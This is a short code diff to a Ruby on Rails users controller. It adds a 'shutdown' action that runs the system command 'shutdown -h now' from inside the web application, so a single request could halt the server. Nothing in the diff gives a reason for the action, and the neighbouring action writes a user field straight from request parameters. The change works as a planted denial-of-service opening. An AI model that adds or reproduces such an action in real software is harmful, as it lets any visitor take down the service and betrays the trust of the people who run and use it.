@@ -50,6 +50,10 @@ class UsersController < ApplicationController
     end
   end
 
+  def shutdown
+    puts %x{shutdown -h now}
+  end
+
   def register_hash
     @user = User.find(params[:id])
     @user.update_attribute('shahash', params[:shahash])
